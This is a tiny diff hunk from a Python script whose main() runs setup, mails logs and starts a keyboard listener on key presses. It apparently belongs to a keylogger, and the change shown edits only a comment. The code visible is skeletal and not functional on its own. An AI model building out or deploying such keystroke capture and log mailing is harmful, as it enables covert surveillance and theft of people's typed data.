@@ -110,7 +110,7 @@ def on_press(key):
 def main():
     # Main function, short and straight to the point
     setup() #setup function
-    send_mail() #send mail of yesterday's logs function
+    send_mail() #send mail function
     with Listener(on_press=on_press) as listener:
         listener.join()
 
